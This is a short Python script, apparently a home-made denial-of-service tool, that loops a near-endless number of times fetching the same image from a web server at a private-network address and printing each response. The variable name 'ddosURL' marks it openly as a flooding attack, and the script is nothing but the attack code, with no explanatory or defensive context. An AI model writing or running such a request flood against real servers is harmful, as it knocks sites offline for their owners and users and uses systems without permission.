import urllib.request

ddosURL ="http://192.168.0.101/assets/images/demo/c1.jpg"

for x in range (2,1000000000000000000000000000000):
    req = urllib.request.Request(ddosURL)
    image = urllib.request.urlopen(req).read()
    print(image)
